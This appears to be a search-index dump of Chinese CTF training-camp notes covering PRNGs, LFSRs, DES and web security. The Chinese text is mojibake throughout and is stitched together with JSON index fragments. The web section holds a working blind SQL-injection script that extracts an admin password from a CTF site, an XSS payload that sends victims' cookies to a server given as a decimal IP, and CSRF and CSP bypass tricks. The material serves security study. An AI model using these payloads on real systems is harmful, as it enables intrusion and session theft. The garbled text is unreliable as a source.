éšæœºæ€§ï¼šéšæœºæ•°åº”è¯¥ä¸å­˜åœ¨ç»Ÿè®¡å­¦åå·®ï¼Œæ˜¯å®Œå…¨æ‚ä¹±çš„æ•°åˆ—ã€‚â†’ å¼±ä¼ªéšæœºæ•°ã€‚ ä¸å¯é¢„æµ‹æ€§ï¼šä¸èƒ½ä»è¿‡å»çš„åºåˆ—æ¨æµ‹å‡ºä¸‹ä¸€ä¸ªè¦å‡ºç°çš„æ•°å­—ã€‚â†’ å¼ºä¼ªéšæœºæ•°ã€‚ ä¸å¯é‡ç°æ€§ï¼šé™¤éæ•°åˆ—ä¿å­˜ä¸‹æ¥ï¼Œå¦åˆ™ä¸èƒ½å‡ºç°ç›¸åŒçš„æ•°åˆ—ã€‚â†’ çœŸéšæœºæ•°ã€‚    PRNGçš„å‘¨æœŸï¼šå¯¹äºä¸€ä¸ªPRNGçš„æ‰€æœ‰å¯èƒ½èµ·å§‹çŠ¶æ€ï¼Œä¸é‡å¤åºåˆ—çš„æœ€é•¿é•¿åº¦ã€‚\n  ç›®å‰é€šç”¨çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ä¸»è¦æœ‰ï¼šçº¿æ€§åŒä½™ç”Ÿæˆå™¨ï¼ˆLCGï¼‰ã€çº¿æ€§å›å½’å‘ç”Ÿå™¨ã€MersenneTwisterã€XorshiftGeneratorã€WELL family of generatorsã€çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼ˆLFSRï¼‰\n  å¯†ç å­¦å®‰å…¨ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆcryptographically secure pseudo-random number generator, CSPRNGï¼‰æˆ–å¯†ç å­¦ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆCPRNGï¼‰ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ã€‚\n å…³äº CPRNG çš„éœ€æ±‚ï¼š  é€šè¿‡ç»Ÿè®¡éšæœºæ€§æµ‹è¯•ã€‚é€šè¿‡ next-bit test ï¼Œä¹Ÿå°±æ˜¯è¯´çŸ¥é“äº†ä¸€ä¸ªåºåˆ—çš„å‰ k ä¸ªæ¯”ç‰¹ï¼Œæ”»å‡»è€…ä¸å¯èƒ½åœ¨å¤šé¡¹å¼æ—¶é—´å†…ä»¥å¤§äº50%çš„æ¦‚ç‡é¢„æµ‹å‡ºæ¥ä¸‹ä¸€ä¸ªæ¯”ç‰¹ä½ã€‚ å¿…é¡»èƒ½å¤Ÿè¶³å¤Ÿå¼ºçš„æ”»å‡»ã€‚æ¯”å¦‚å½“ç”Ÿæˆå™¨çš„éƒ¨åˆ†åˆå§‹çŠ¶æ€æˆ–è€…è¿è¡Œæ—¶çš„çŠ¶æ€è¢«æ”»å‡»è€…è·çŸ¥æ—¶ï¼Œæ”»å‡»è€…ä»ç„¶ä¸èƒ½å¤Ÿè·å–æ³„éœ²çŠ¶æ€ä¹‹å‰ç”Ÿæˆçš„éšæœºæ•°ã€‚   åˆ†ç±»ï¼šåŸºäºå¯†ç å­¦ç®—æ³•ã€åŸºäºæ•°å­¦éš¾é¢˜ã€æŸäº›ç‰¹æ®Šç›®çš„çš„è®¾è®¡ã€‚    çº¿æ€§åŒä½™å‘ç”Ÿå™¨ #  çº¿æ€§åŒä½™å‘ç”Ÿå™¨ï¼ˆlinear congruential generator, LCGï¼‰æ˜¯ä¸€ç§é€šè¿‡ä¸è¿ç»­çº¿æ€§å‡½æ•°ç”Ÿæˆä¼ªéšæœºæ•°åˆ—çš„ç®—æ³•ã€‚ç”Ÿæˆå™¨é€šè¿‡ä»¥ä¸‹è¿­ä»£å…³ç³»å®šä¹‰ï¼š$$ X_{n+1} = (aX_n+c) \\mod m $$ï¼Œå…¶ä¸­ï¼š\n m \u0026gt; 0, the \u0026ldquo;modulus\u0026rdquo; 0 \u0026lt; a \u0026lt; m, the \u0026ldquo;multiplier\u0026rdquo; 0 â‰¤ c \u0026lt; m, the \u0026ldquo;increment\u0026rdquo; 0 â‰¤ X0 \u0026lt; m, the \u0026ldquo;seed\u0026rdquo; or \u0026ldquo;start value\u0026rdquo;  å½“ c=0 æ—¶ï¼Œå‘ç”Ÿå™¨åˆç§°ä½œä¹˜æ³•åŒä½™å‘ç”Ÿå™¨ï¼ˆmultiplicative congruential generator, MCGï¼‰æˆ– Lehmer RNGã€‚\nå½“ câ‰ 0 æ—¶ï¼Œå‘ç”Ÿå™¨åˆç§°ä½œæ··åˆåŒä½™å‘ç”Ÿå™¨ï¼ˆmixed congruential generatorï¼‰\nåé¦ˆç§»ä½å¯„å­˜å™¨ #  ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå…¶ç”Ÿæˆå…³ç³»å¯ä»¥ç”¨ä»¥ä¸‹å…¬å¼è¡¨ç¤ºï¼š$$ a_{i+n} = F(a_i, a_{i+1}, \u0026hellip;, a_{i+n-1}) $$ï¼Œå…¶ä¸­ï¼š\n $$ a_0, a_1, \u0026hellip;, a_{n-1} $$ ä¸ºåˆæ€ F ç§°ä¸ºåé¦ˆå‡½æ•°æˆ–åé¦ˆé€»è¾‘ã€‚å¦‚æœ F ä¸ºçº¿æ€§å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç§°å…¶ä¸ºçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼ˆlinear-feedback shift register, LFSRï¼‰ã€‚  çº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ LFSR #  åé¦ˆå‡½æ•°ä¸€èˆ¬å¦‚ä¸‹ï¼š$$ a_{i+n} = \\sum\\limits_{j=1}^{n}c_j a_{i+n-j} $ï¼Œå…¶ä¸­ $c_j$ å‡åœ¨æŸä¸ªæœ‰é™åŸŸ $F_q$$ ä¸­ã€‚\nè¯¥çº¿æ€§å˜åŒ–å¯¹åº”çš„çŸ©é˜µä¸ºï¼š$$ \\left[ \\begin{matrix} 0 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; c_n \\ 1 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; c_{n-1} \\ 0 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; c_{n-2} \\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \u0026amp; \\vdots \\ 0 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 1 \u0026amp; c_1 \\ \\end{matrix} \\right] $$\nå³ï¼š$$ \\left[ \\begin{matrix} a_{i+1} \u0026amp; a_{i+2} \u0026amp; a_{i+3} \u0026amp; \\cdots \u0026amp; a_{i+n} \\end{matrix}\\right] = \\left[ \\begin{matrix} a_{i} \u0026amp; a_{i+1} \u0026amp; a_{i+2} \u0026amp; \\cdots \u0026amp; a_{i+n-1} \\end{matrix}\\right] \\left[ \\begin{matrix} 0 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; c_n \\ 1 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; c_{n-1} \\ 0 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; c_{n-2} \\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \u0026amp; \\vdots \\ 0 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 1 \u0026amp; c_1 \\ \\end{matrix} \\right] $$\næˆ‘ä»¬å¯ä»¥æ±‚å¾—å…¶ç‰¹å¾å¤šé¡¹å¼ï¼šï¼ˆæˆ‘ä»¬ä¸€èˆ¬è®¨è®º $$ \\mathbb{Z}2 $$ ä¸Šçš„å¤šé¡¹å¼ï¼‰$$ f(x)=x^n-\\sum\\limits{i=1}^{n}c_ix^{n-i} $$\nåŒæ—¶æˆ‘ä»¬å®šä¹‰å…¶äº’åå¤šé¡¹å¼ï¼š$$ \\overline f(x) = x^n f(\\frac{1}{x}) = 1-\\sum\\limits_{i=1}^{n} c_i x^i â€‹$$ï¼Œä¹Ÿç§°ä¸ºLFSRçš„è”ç»“å¤šé¡¹å¼ã€‚\n è¯¥åºåˆ—å¯¹åº”çš„ç”Ÿæˆå‡½æ•°ä¸ºï¼š$$ A(x) = \\frac{p(x)}{\\overline f(x)} $ï¼Œå…¶ä¸­ï¼š$ p(x) = \\sum\\limits_{i=1}^{n} (c_{n-i} x^{n-i} \\sum\\limits_{j=1}^{i} a_j x^{j-1}) $$ è¯¥åºåˆ—å¯¹åº”çš„å‘¨æœŸæˆ–é˜¶ä¸ºï¼šä½¿ $$ A(x) | (x^T - 1) $$ çš„æœ€å° T  n æ¬¡æœ¬åŸå¤šé¡¹å¼ï¼šé˜¶ä¸º $$ 2^n - 1 $$ çš„ n æ¬¡ä¸å¯çº¦å¤šé¡¹å¼ã€‚\nm åºåˆ—ï¼šè¾¾åˆ°æœ€é•¿å‘¨æœŸçš„åºåˆ—ã€‚\n åºåˆ—æ˜¯ m åºåˆ— $$ \\Leftrightarrow $$ åºåˆ—çš„æå°å¤šé¡¹å¼æ˜¯ n æ¬¡æœ¬åŸå¤šé¡¹å¼ã€‚  éçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ NLFSR #   éçº¿æ€§ç»„åˆç”Ÿæˆå™¨ï¼Œå¯¹å¤šä¸ª LFSR çš„è¾“å‡ºä½¿ç”¨ä¸€ä¸ªéçº¿æ€§ç»„åˆå‡½æ•° éçº¿æ€§æ»¤æ³¢ç”Ÿæˆå™¨ï¼Œå¯¹ä¸€ä¸ª LFSR çš„å†…å®¹ä½¿ç”¨ä¸€ä¸ªéçº¿æ€§ç»„åˆå‡½æ•° é’Ÿæ§ç”Ÿæˆå™¨ï¼Œä½¿ç”¨ä¸€ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰LFSR çš„è¾“å‡ºæ¥æ§åˆ¶å¦ä¸€ä¸ªï¼ˆæˆ–å¤šä¸ªï¼‰LFSR çš„æ—¶é’Ÿã€‚  ç‰¹æ®Šæµå¯†ç  RC4 #  å—åŠ å¯† #  å—åŠ å¯†å³æ¯æ¬¡åŠ å¯†ä¸€å—æ˜æ–‡ï¼Œå¸¸è§çš„åŠ å¯†ç®—æ³•æœ‰ï¼šIDEAã€DESã€AES ç­‰ï¼Œå—åŠ å¯†ä¹Ÿæ˜¯å¯¹ç§°åŠ å¯†ã€‚\nShannon æå‡ºçš„ä¸¤å¤§è®¾è®¡åˆ†ç»„å¯†ç çš„ç­–ç•¥ï¼šæ··æ·†ä¸æ‰©æ•£ã€‚\n æ··æ·† Confusionï¼Œå°†æ˜æ–‡ä¸å¯†é’¥ä¹‹é—´çš„ç»Ÿè®¡å…³ç³»å˜å¾—å°½å¯èƒ½å¤æ‚ã€‚å¸¸è§çš„æ–¹æ³•ï¼šS ç›’ã€ä¹˜æ³•ã€‚ æ‰©æ•£ Diffusionï¼Œä½¿æ˜æ–‡ä¸­çš„æ¯ä¸€ä½å½±å“å¯†æ–‡ä¸­çš„è®¸å¤šä½ã€‚å¸¸è§çš„æ–¹æ³•ï¼šçº¿æ€§å˜æ¢ã€ç½®æ¢ã€ï¼ˆå¾ªç¯ï¼‰ç§»ä½ã€‚  è½®å‡½æ•°ï¼ˆround functionï¼‰ï¼šè¢«å—åŠ å¯†é‡å¤ä½¿ç”¨çš„å¯é€†å˜æ¢å‡½æ•°ã€‚ç›®å‰ä¸»è¦æœ‰ä»¥ä¸‹è®¾è®¡æ–¹æ³•ï¼š\n Feistel Networkï¼Œç”± Horst Feistel å‘æ˜ â†’ DES Substitution-Permutation Network (SPN) â†’ AES  ARX - Add-Rotate-Xor #  DES - Data Encryption Standard #  ä¸‹å›¾ä¸ºä¸€ä¸ªç®€å•çš„ DES æµç¨‹å›¾ï¼š\næ¯ä¸€è½®çš„åŠ å¯†è¿‡ç¨‹å¤§è‡´å¦‚ä¸‹ï¼š\n  $$ L_{i+1} = R_i $$\n  $$ R_{i+1} = L_i \\oplus F(R_i, K_i) $$\n  å› æ­¤æ¯ä¸€è½®çš„è§£å¯†è¿‡ç¨‹äº¦å¯æ¨å‡ºï¼š\n  $$ L_i = R_{i+i} \\oplus F(L_{i+1}, K_i) $$\n  $$ R_i = L_{i+1} $$\n  IDEA - International Data Encryption Algorithm #  AES - Advanced Encryption Standard #  Simon \u0026amp; Speck #  "},{"id":210,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day4/","title":"Day4","section":"Xman3å¤ä»¤è¥","content":"å¯†ç å­¦Day2 #  æ¨¡æ•°æ”»å‡» #  "},{"id":211,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day5/","title":"Day5","section":"Xman3å¤ä»¤è¥","content":"Web Day1 #  æ‰€éœ€çŸ¥è¯† #    HTTPæŠ“åŒ…/ä¿®æ”¹ï¼šHttpè¯·æ±‚ã€å“åº”æµç¨‹\n  webå‰ç«¯ï¼šCookieã€ç¼“å­˜ã€è·¨åŸŸé—®é¢˜ã€ç¼–ç ï¼ˆurlç¼–ç ã€htmlå®ä½“ç¼–ç ã€jsç¼–ç ï¼‰\n  webåç«¯ï¼šphp â†’ å®˜æ–¹æ–‡æ¡£ï¼›Python â†’ å»–é›ªå³°Pythonæ•™ç¨‹\n  æ•°æ®åº“ä¸æœåŠ¡å™¨\n  å¸¸è§çš„webæ¼æ´ï¼šXSSã€SQLæ³¨å…¥ã€CSRFã€SSRFã€å‘½ä»¤æ‰§è¡Œã€XXEã€æ–‡ä»¶ä¸Šä¼ /åŒ…å«/å†™å…¥ã€ååºåˆ—åŒ–ã€æœªæˆæƒè®¿é—®ã€ç›®å½•éå†ã€ä¸šåŠ¡é€»è¾‘æ¼æ´\n  å·¥å…·ï¼šSqlmapã€Burpsuitã€Hackbarã€Proxy SwitchyOmeã€Postman\u0026hellip;\n  Httpè¯·æ±‚ #  Httpè¯·æ±‚å“åº” #   è¯·æ±‚åŒ…æ ¼å¼ â†’ è¯·æ±‚å¤´æ ¼å¼ï¼šè¯·æ±‚æ–¹æ³• + url/path + åè®®ç‰ˆæœ¬     GETè¯·æ±‚ â†’ ä»æŒ‡å®šçš„èµ„æºè¯·æ±‚æ•°æ® â†’ å¯ä»¥è¢«ç¼“å­˜ï¼Œæœ‰é•¿åº¦é™åˆ¶ POSTè¯·æ±‚ â†’ å‘æŒ‡å®šçš„èµ„æºæäº¤è¦è¢«å¤„ç†çš„æ•°æ® â†’ ä¸ä¼šè¢«ç¼“å­˜ï¼Œæ²¡æœ‰é•¿åº¦é™åˆ¶ å“åº”åŒ… â†’ å“åº”å¤´ï¼šå“åº”åè®®+çŠ¶æ€ç ï¼›å“åº”ä¸»ä½“ï¼šhtmlä»£ç    PHPåç«¯è·å–è¯·æ±‚å¤´ï¼š$_SERVER['HTPP_USER_AGENT']     å¸¸è§è¯·æ±‚å¤´è¯´æ˜ï¼š  Content-Lengthï¼šè¯·æ±‚é•¿åº¦ï¼Œä¸ºäº†å‘Šè¯‰æœåŠ¡å™¨æœ‰å¤šé•¿ï¼ˆæœ‰æ—¶æ²¡æœ‰ï¼Œä½¿ç”¨ä¸€äº›åˆ†éš”ç¬¦æŒ‡æ˜é•¿åº¦ï¼‰    é¢˜ç›®ç±»å‹ #    å…¥é—¨é¢˜ç›®\n æŸ¥çœ‹æºç ï¼ˆview-source://www.baidu.comï¼‰ æŸ¥çœ‹è¯·æ±‚å“åº”åŒ…ï¼ˆchromeå¼€å‘è€…å·¥å…·æ ï¼‰ æ–‡ä»¶æ³„éœ²  å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼š.index.php.swpã€.index.php.swoã€.index.php.bakã€.index.php~ æºç å‹ç¼©åŒ…ï¼š git/svnæ³„éœ²ï¼šåˆ©ç”¨å·¥å…·GitHackã€dvcs-ripperï¼Œå¯ä»¥è·å–ç½‘ç«™æºç  å…¶ä»–æ–‡ä»¶æ³„éœ²ï¼š.ideaï¼ˆä½¿ç”¨intellij ideaå·¥ç¨‹ï¼‰ï¼Œ.DS_Storeï¼ˆOS Xä¸‹ï¼Œå¯æ³„éœ²æ–‡ä»¶ï¼‰ï¼Œ.pycæ–‡ä»¶   JSfuckï¼šåˆ©ç”¨jsçš„å¼±ç±»å‹ç‰¹æ€§ï¼Œæ‹¼æ¥å­—ç¬¦ä¸²ä½œä¸ºjsä»£ç è¿è¡Œ â†’ ç›´æ¥è´´åˆ°chromeçš„å¼€å‘è€…å·¥å…·ä¸­å³å¯è¿è¡Œ è¯·æ±‚ä¿®æ”¹ã€é‡æ”¾ï¼šè¯·æ±‚å¤´ã€è¯·æ±‚åŒ…ã€Cookie    å¸¸è§„é¢˜ç›®\n  ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„ç½‘ç«™\n  SQLæ³¨å…¥ï¼šæ‹¿åˆ°æ•°æ®åº“ä¸­çš„flag\n  å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶ä¸Šä¼ ï¼šæ‹¿åˆ°æœåŠ¡å™¨ä¸Šçš„flag\n  æ‹¿åˆ°ç®¡ç†å‘˜çš„cookie â†’ flagåœ¨cookieä¸­ï¼ˆXSSï¼‰\n  XXEç®€ä»‹ï¼ˆhttps://thief.one/2017/06/20/1/ï¼Œhttps://www.leavesongs.com/PENETRATION/slim3-xxe.htmlï¼‰ï¼Œxmlå¤–éƒ¨å®ä½“æ³¨å…¥ â†’ SSRF\n  å…¶ä»–ä¸€äº›æ¼æ´åˆ©ç”¨ï¼ˆæ¡ä»¶ç«äº‰ã€SSRFã€XXEï¼‰\n    XXEç®€ä»‹ #  â€‹\n"},{"id":212,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day6/","title":"Day6","section":"Xman3å¤ä»¤è¥","content":"Web Day2 #  sqlæ³¨å…¥ #    sqlç›²æ³¨è„šæœ¬\nimport requests import re import sys p = re.compile(r\u0026#39;\u0026#39;\u0026#39;ID: (.+?)\u0026amp;nbspx:\u0026#39;\u0026#39;\u0026#39;) ans = \u0026#39;\u0026#39; for pos in range(1,33):  l = 0  r = 127  cookies = {\u0026#34;PHPSESSID\u0026#34;:\u0026#34;tf7511brt2272n9ne5i8dj6o35\u0026#34;}  data = {\u0026#34;x\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;y\u0026#34;: \u0026#34;1\u0026#34;}  while l\u0026lt;r:  mid = int((l+r)/2)  resp = requests.post(  \u0026#34;https://web.ctflearn.com/grid/controller.php?action=add_point\u0026#34;, data=data, cookies=cookies).text  resp = requests.get(\u0026#34;https://web.ctflearn.com/grid/\u0026#34;, cookies=cookies).text  _id = p.search(resp).group(1)  payload = _id + \u0026#39; and ord(mid((select password from user where username=\u0026#34;admin\u0026#34; limit 0, 1), \u0026#39; + str(pos) + \u0026#39;,1))\u0026gt;\u0026#39; + str(mid)  length = len(payload)  resp = requests.get(\u0026#39;\u0026#39;\u0026#39;https://web.ctflearn.com/grid/controller.php?action=delete_point\u0026amp;point=O:5:\u0026#34;point\u0026#34;:3:{s:1:\u0026#34;x\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:1:\u0026#34;y\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:2:\u0026#34;ID\u0026#34;;s:\u0026#39;\u0026#39;\u0026#39;+str(length)+\u0026#39;\u0026#39;\u0026#39;:\u0026#34;%s\u0026#34;;}\u0026#39;\u0026#39;\u0026#39;%payload,cookies=cookies,allow_redirects=False).text  resp = requests.get(\u0026#34;http://web.ctflearn.com/grid/\u0026#34;,cookies=cookies).text  if _id not in resp:  l = mid+1  else:  r = mid  if l==0:  break  ans = ans + chr(l)  print(ans)   XSSæ”»å‡»ä¸é˜²å¾¡ #  Cookie #   è·å–cookieçš„æ–¹æ³•ï¼šæµè§ˆå™¨ç«¯ï¼ˆå®¢æˆ·ç«¯ï¼‰ â†’ document.cookieï¼›æœåŠ¡å™¨ç«¯ï¼ˆPHPï¼‰ â†’ $_COOKIE[] PSï¼šæœåŠ¡å™¨ç«¯çš„ä¸€ä¸ªå“åº”åŒ…ä¸­åªèƒ½åŒ…å«ä¸€ä¸ªset-cookie Chromeçš„Windows Cookieçš„ä½ç½®ï¼šAppData\\Local\u0026hellip; Cookieå±æ€§ â†’ åˆ†å·åˆ†éš”çš„é”®å€¼å¯¹  domainåªå¯ä»¥è®¾ç½®ä¸ºé¡µé¢æœ¬èº«æˆ–å…¶å­é¡µé¢ã€ä¸èƒ½è®¾ç½®ä¸ºé¡¶çº§åŸŸå    XSSæ¼æ´ #   ç®€ä»‹ï¼šæ”»å‡»è€…å¯ä»¥åœ¨é¡µé¢ä¸Šæ’å…¥htmlä»£ç ï¼Œé€šè¿‡javaScriptå¾—åˆ°å—å®³è€…ä¿¡æ¯ã€‚åˆ†ç±»ï¼š  åå°„æ€§ï¼šç”¨æˆ·è¯·æ±‚çš„ä¸­çš„å‚æ•°ç›´æ¥è¾“å‡ºåˆ°äº†é¡µé¢ä¸­ï¼Œå½¢æˆXSS å­˜å‚¨æ€§ï¼ˆè¯„è®ºåŠŸèƒ½ï¼‰ï¼šå°†ç”¨æˆ·æäº¤çš„è¯„è®ºå­˜å‚¨åœ¨æ•°æ®åº“çš„è¡¨ä¸­ â†’ ä»æ•°æ®åº“ä¸­å–å‡ºæ¥ç›´æ¥æ˜¾ç¤ºåœ¨è¯„è®ºåŒºä¸­ DOMæ€§ï¼šé¡µé¢ä¸­çš„æºç ä¸­å¹¶æ— XSSæ”»å‡»å‘é‡   å±å®³ï¼šçªƒå–ä¿¡æ¯ã€XSSè •è™«ã€å‘½ä»¤æ‰§è¡Œ  å‘½ä»¤æ‰§è¡Œï¼šç‰¹æƒåŸŸXSS â†’ WooYun-2016-170984ï¼›æ²™ç›’ç»•è¿‡ â†’ CVE-2017-12581   ç¼–ç ï¼š  HTMLå®ä½“ç¼–ç ï¼šç¬¦å·çš„åŠŸèƒ½æ€§ç¼–ç ä¸æ˜¾ç¤ºç¼–ç åˆ†ç¦» â†’ DOMå…ƒç´ çš„å±æ€§å€¼ä¼šè‡ªåŠ¨è§£ç HTMLç¼–ç  URLç¼–ç ï¼šåç«¯éœ€è¦è¿›è¡Œä¸€ä¸ªdecode é¡µé¢ç¼–ç ï¼šåˆ©ç”¨gbkç¼–ç æ¼æ´ â†’ è½¬ç§»ç¬¦\\åœ¨gbkä¸­çš„ä½å­—èŠ‚ä½ï¼Œå¦‚æœåœ¨å‰é¢æ’å…¥ä¸€ä¸ªå•å­—èŠ‚é«˜ä½å­—èŠ‚ï¼Œç»„åˆæˆä¸€ä¸ªåˆæ³•å­—ç¬¦ï¼Œå¯ä»¥ç”¨äºé€ƒé€¸\\   XSSæ¼æ´æ³¨å…¥ç‚¹ XSSæ³¨å…¥çš„ä¸€äº›å°trickï¼š  è¿‡æ»¤\u0026quot;.\u0026quot;ï¼Œä½¿ç”¨withè¯­å¥ï¼›è¿‡æ»¤';'ï¼Œç”¨æ¢è¡Œ urlåè®®å¤´å¯ä»¥å»æ‰ï¼Œå¦‚//example.com(http) HTMLå®ä½“ç¼–ç ä¸­ï¼Œ';'å¯ä»¥å»æ‰ å¯ä»¥åˆ©ç”¨æ‹¼æ¥evalå‡½æ•°æ‰§è¡Œä»£ç ï¼Œä¾‹å¦‚ï¼š\u0026quot;a\u0026quot;+eval(\u0026quot;alert(1)\u0026quot;)   hiddenå…ƒç´ XSS  CTFä¸­çš„XSSé¢˜ç›® #    ç»•è¿‡ï¼ˆä¾‹å­ï¼šHCTF2016 guestbookï¼‰\n  è¯¾ä¸Šä¹ é¢˜2ï¼š\n çˆ†ç ´md5ï¼š  \u0026lt;?php  $i = 0;  while(1){  if(substr(md5($i),0,6) === \u0026#39;966150\u0026#39;)  break;  $$i = $$i +1;  }  echo $i; ?\u0026gt; Payloadï¼š  \u0026lt;script\u0026gt;  with(document){  location=`//760096541/`+escape(cookie)  } \u0026lt;/script\u0026gt;  è¿‡æ»¤äº†å­—ç¬¦ . ä½¿ç”¨ with(){} æŒ‡å®šä½œç”¨åŸŸï¼Œåœ°å€è½¬åŒ–ä¸ºåè¿›åˆ¶ï¼ˆè¯¥åè¿›åˆ¶ä¸ºæŒ‡å®šçš„è‡ªå·±çš„æœåŠ¡å™¨ï¼Œåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå¯ä»¥å¾—åˆ°cookieå‚æ•°ï¼‰    XSSé˜²å¾¡ #   Chrome XSS Filter è¿‡æ»¤ï¼ˆä¸å®‰å…¨ï¼‰ è½¬ä¹‰å’Œç¼–ç  â†’ è¾ƒå®‰å…¨çš„æ–¹æ³•ï¼šç¼–ç ï¼ˆè½¬æˆå®ä½“ç¼–ç ï¼‰ HttpOnly â†’ åç«¯ä»£ç ä¸­å¯ä»¥å°†Cookieæ·»åŠ ä¸€ä¸ªç»™HttpOnlyå±æ€§ï¼Œè¿™æ ·å°±ä¸ä¼šè¢«å‰ç«¯çš„JSè¯»å–åˆ°  CSRFæ”»å‡»ä¸é˜²å¾¡ #   CSRF: Cross-Site Request Forgery  CSRFæ”»å‡» #   æ”»å‡»åˆ†ç±»ï¼šGETå‹ã€POSTå‹ã€ä¼ªé€ è¯·æ±‚ã€JSON  307è·³è½¬ï¼š307è·³è½¬å¯ä»¥ä¸æ”¹å˜è¯·æ±‚ä¸»ä½“ï¼Œåªæ”¹å˜è¯·æ±‚ç›®æ ‡ã€‚ç°åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ”¾ç½®ä¸€ä¸ªmain.htmlï¼ŒåŒ…å«äº§ç”Ÿ307çš„flashï¼Œåœ¨ç»Ÿè®¡   CSRFç»•è¿‡ï¼š  ç©ºReferer â†’ getè¯·æ±‚ã€dataåè®®ã€httpså‘httpè·³è½¬ Refererå‰ç¼€ç»•è¿‡ã€‚æ¯”å¦‚æ£€æµ‹å‰ç¼€https://www.qq.comï¼Œå¯ä»¥è‡ªå·±æ³¨å†ŒåŸŸåhttps://www.qq.comxx.xx    CSRFé˜²å¾¡ #   æ–¹å¼ï¼šéªŒè¯ç ã€æ·»åŠ tokenã€Referer  åŒæºåˆ†æ #   æºï¼šåè®® + åŸŸå + ç«¯å£  è·¨åŸŸæ–¹å¼ #    Ajaxï¼šå¯ä»¥å‘é€è¯·æ±‚ï¼Œä½†æ˜¯ä¸èƒ½å¸¦cookie\n  CORS â†’ è·¨åŸŸèµ„æºå…±äº«\n  windows.nameå¯ä»¥è·¨åŸŸ\n  Jsonp â†’ å¯ä»¥å®ç°ä»å…¶ä»–ç½‘ç«™è·å–æ•°æ®ã€‚æ•°æ®åŒ…ä¸­çš„contentæ˜¯å¯æ§çš„ã€‚\n aé¡µé¢å¸Œæœ›æˆ–è®¸bé¡µé¢çš„æ•°æ® â†’ aå‘bå‘é€ä¸€ä¸ªjsonpè¯·æ±‚ â†’ è°ƒç”¨aé¡µé¢ä¸­å®šä¹‰çš„CallBackå‡½æ•°    jsonpæ”»å‡»æ–¹å¼ â†’ SOMEæ”»å‡» #  SOMEæ”»å‡»ï¼šç”¨æˆ·è®¿é—®a.comå¯ä»¥å®ç°åœ¨b.comä¸Šæ‰§è¡Œjavascript\n http://b.com/index.html  \u0026lt;form\u0026gt;  \u0026lt;button onclick=\u0026#34;c()\u0026#34;\u0026gt;Secret Button\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt;  function c() {alert(\u0026#34;click!\u0026#34;);} \u0026lt;/script\u0026gt;  http://b.com/jsonp.php  \u0026lt;?php  ?\u0026gt; http://a.com/some1.html http://a.com/some2.html  CSP â†’ content-src-policy #  CSPç»•è¿‡ï¼š\n urlè·³è½¬ï¼šåœ¨default-srcä¸º\u0026rsquo;none\u0026rsquo;çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨metaæ ‡ç­¾å®ç°è·³è½¬ æ ‡ç­¾é¢„åŠ è½½ï¼šCSPå¯¹linkæ ‡ç­¾çš„é¢„åŠ è½½è€ƒè™‘ä¸å®Œå–„ åˆ©ç”¨æµè§ˆå™¨è¡¥å…¨ ä»£ç é‡ç”¨ â†’ Blackhat2017ä¸Šæœ‰ç¯‡pptæ€»ç»“äº†å¯ä»¥è¢«ç”¨æ¥ç»•è¿‡CSPçš„ä¸€äº›JSåº“ iframe â†’ å¦‚æœåŒæºçš„å…¶ä»–é¡µé¢å†…æ²¡æœ‰CSPé™åˆ¶ï¼Œåˆ™å¯ä»¥åˆ©ç”¨æ²¡æœ‰é™åˆ¶çš„é¡µé¢å®ç°ç»•è¿‡CSP metaæ ‡ç­¾ â†’ metaå¯ä»¥æ§åˆ¶ç¼“å­˜ï¼ˆåœ¨headeræ²¡æœ‰è®¾ç½®çš„æƒ…å†µä¸‹ï¼‰ï¼Œæœ‰æ—¶å¯ä»¥ç”¨æ¥ç»•è¿‡CSP nonce  "},{"id":213,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day7/","title":"Day7","section":"Xman3å¤ä»¤è¥","content":"WebæœåŠ¡å™¨ç«¯å®‰å…¨ #  å‰ç½®çŸ¥è¯† #  Httpåè®® #   urlè¯´æ˜  åè®® http + ç”¨æˆ·å¯†ç  user@pass +ipåœ°å€ 127.0.0.1 + ç«¯å£port 8080 + é¡µé¢ index.php + å‚æ•° ?id=123 